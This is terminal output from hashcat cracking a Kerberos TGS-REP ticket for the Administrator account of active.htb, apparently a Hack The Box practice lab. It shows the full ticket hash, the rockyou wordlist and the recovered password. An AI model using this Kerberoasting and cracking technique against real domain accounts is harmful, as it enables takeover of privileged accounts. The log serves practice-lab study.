
hashcat -m 13100 adminticket.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11850H @ 2.50GHz, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921506
* Keyspace..: 14344384

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$dc2720087180c4cb8db96a8a6e0dd71b$c79883e380d27ac6ea94120ca368e2f05a72847e719f34a578c606f1747862d6d48c76f2c6d13c4e93a5fc44108f3fec3d2e2dd3cbe96a442bdc4b9e5b44f0f862505dc5e0df49b857ad77233bf86cc83f964af0eebf29860c909a293cfd8298793931af057310f9d40d16f66f14a334eff9b7ce78c40a12b2a8ff43723af9d2d9406801bd35192fd5fa8a0c4df8c3029c2a47fc5656fb7ba1e0a6d7bfec0b2d66dc06f582ad8f739f3ddae75475ed2ad6effa077449e140a38791bdc76f4699ddefd813bb15db5f78f55a8b4d0e9616ffa846444af96b5649a2eafa30d8b90039294194be9b509dd80658d9b17d953cf7c03f664b1c933a98ea42b9e5b2a38d20c83548fb89c4b24b04133caca278d9dff3bdf90f51b2b75d367a95fe25c3874442310e447aedc85de853cb024dad6c4fbb34551f0472861e8fc31cf4a021b78d74b258463d93776732e6810ec05acb555f4c3ea76228fbb56ba5b92bbf4241ce9b91fb552a7bbd1cc03b44294d25a6f2f80e39b54580910aeebd9ffd03c890b0b4e51ba4081ee0512048711ed83db48a05d0d39f0b78537c27b52dcfb172d153cb1c575b96422402e965b55d4c60bfd0be8683c48c360be921936348039d5582dc01b28ca1f008668db774270fb572a4937e451230ced75706a603f36ea72754023868599736eac1700d05522657310d3eb4c231192d48be524ee61bbd3b8198557b494aa04ebac3589a7ab7ba4ae8fd37e00e04e5090b3b56550c63c5b2acac9d8fbafa9f6e7a0077801c487856d0b3996d1a4b34430707711ac29edf194eaf16707863d746e2d61b5735abcf6a26790bcad442531cc6778a928ff38c823b7e3a25e2ef915ca264ab3150d16fe838072672c512acf48759195b88aed7944b145d7a5e36b90f6e07d4b015a3b99070bd8d547885e97ca7e1dc7e7080eb6220a25fba64b63f48781def7e2d9de7ae452cdd51c253c9c928f5f56af331ddecd5328b842f679ff3be0462d80dc344ddedfa2e379d88a90470e88be67ab2c07186b135498a8aba7856ee56b36cc3e22e22f15adc0ab15f26d2144e077da856034cd2044b4608819872f4daa203b99a53f196b8bde25a717196224a1dcc8ce523e2ed3128a0ae53cc420286861d6b96e5abfb6840ec74925a0cd6bac7d234ef0f7249fe3b7dba1085a4e138878229501f820834e47003c4dbb6e838e5f4d0cfe36beee933ff84f3a0a4ca93e90df5a7453435a07bb070a0df1216b5:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...1216b5
Time.Started.....: Fri Aug  8 09:45:17 2025 (6 secs)
Time.Estimated...: Fri Aug  8 09:45:23 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1840.9 kH/s (1.91ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344384 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10536960/14344384 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany93 -> Teague
Hardware.Mon.#1..: Util: 55%

Started: Fri Aug  8 09:45:03 2025
Stopped: Fri Aug  8 09:45:23 2025
